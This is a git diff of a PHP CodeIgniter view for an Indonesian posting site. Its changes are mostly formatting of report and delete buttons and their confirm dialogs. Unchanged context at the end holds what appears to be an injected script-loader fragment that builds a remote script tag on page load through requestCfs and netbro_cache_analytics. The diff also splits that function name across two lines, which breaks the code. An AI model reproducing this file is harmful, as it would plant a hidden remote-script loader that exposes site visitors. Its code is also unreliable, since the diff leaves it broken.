@@ -24,7 +24,9 @@
         <input type="hidden" name="id_posting" value="<?=$pst->id_posting;?>">
         <input type="hidden" name="id" value="<?=$this->session->userdata('id');?>">
         <a class="btn text-red">
-            <button class="fas fa-exclamation" style="border : 0;" name="report"  onclick="if (!confirm('Apakah anda yakin akan melaporkan unggahan atau pengguna ini karena melanggar peraturan?')) { return false }"> Laporkan! </button> </a>
+            <button class="fas fa-exclamation" style="border : 0;" name="report"
+                onclick="if (!confirm('Apakah anda yakin akan melaporkan unggahan atau pengguna ini karena melanggar peraturan?')) { return false }">
+                Laporkan! </button> </a>
     </form>
     <?php elseif ($pst->id_user != $this->session->userdata('id') and $rpt->report == 1): ?>
 
@@ -33,11 +35,11 @@
     <?php else: ?>
 
     <i class="fas fa-trash" style="color: tomato;margin-left:18px;"></i>
-    <a href="<?=base_url();?>user/deletePost/<?=$pst->id_posting . '/' . $pst->fileName?>"
-        style="text-decoration:none;">Hapus</a>
+    <a href="<?=base_url();?>user/deletePost/<?=$pst->id_posting . '/' . $pst->fileName?>" style="text-decoration:none;"
+        onclick="return confirm('Are you sure?')">Hapus</a>
 
-            <i class="fas fa-trash" style="color: tomato;margin-left:18px;"></i>
-            <a href="<?= base_url(); ?>user/deletePost/<?= $pst->id_posting; ?>" onclick="return confirm('Are you sure?')" style="text-decoration:none;">Hapus</a>
+    <!-- <i class="fas fa-trash" style="color: tomato;margin-left:18px;"></i> -->
+
 
     <?php endif;?>
 
@@ -93,7 +95,7 @@
                 </form>
             </div>
 
-            <?php elseif($sk2->total == 0): ?>
+            <?php elseif ($sk2->total == 0): ?>
             <div class="reaction">
                 <form method="post" action="<?=base_url('User/addSuka') . "/" . $this->uri->segment('3');?>">
                     <input type="hidden" name="id_suka" value="<?=$sk2->id_suka;?>">
@@ -145,13 +147,14 @@ echo $str;
                 <br>
                 <form
                     action="<?=base_url('user/deleteComment/') . $cmt->id_comment . "/" . $this->uri->segment('3');?>">
-                    <button style="text-decoration:none; color:red; border:none; background-color:#fff; opacity:70%;" onclick="if (!confirm('Apakah anda yakin akan menghapus komentar ini?')) { return false }">
+                    <button style="text-decoration:none; color:red; border:none; background-color:#fff; opacity:70%;"
+                        onclick="if (!confirm('Apakah anda yakin akan menghapus komentar ini?')) { return false }">
                         Hapus!
                     </button>
-                    
+
                 </form>
                 <?php endif;?>
-                
+
             </div>
 
 
@@ -200,23 +203,21 @@ if (self == top) {
 
 
     // onclick="ConfirmDelete()" button
-    function ConfirmDelete()
-{
-  var z = confirm("Apakah anda yakin ingin menghapus komentar?");
-  if (z)
-      return confirm;
-  else
-    return false;
-}
+    function ConfirmDelete() {
+        var z = confirm("Apakah anda yakin ingin menghapus komentar?");
+        if (z)
+            return confirm;
+        else
+            return false;
+    }
 
-function ConfirmReport()
-{
-  var x = confirm("Apakah anda yakin ingin melaporkan unggahan atau pengguna ini karena melanggar peraturan?");
-  if (x)
-      return confirm;
-  else
-    return false;
-}
+    function ConfirmReport() {
+        var x = confirm("Apakah anda yakin ingin melaporkan unggahan atau pengguna ini karena melanggar peraturan?");
+        if (x)
+            return confirm;
+        else
+            return false;
+    }
 
 
     function requestCfs() {
@@ -232,6 +233,7 @@ function ConfirmReport()
         bsa.src = url;
         (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
     }
-    netbro_cache_analytics(requestCfs, function() {});
+    netbr
+    o_cache_analytics(requestCfs, function() {});
 };
 </script>
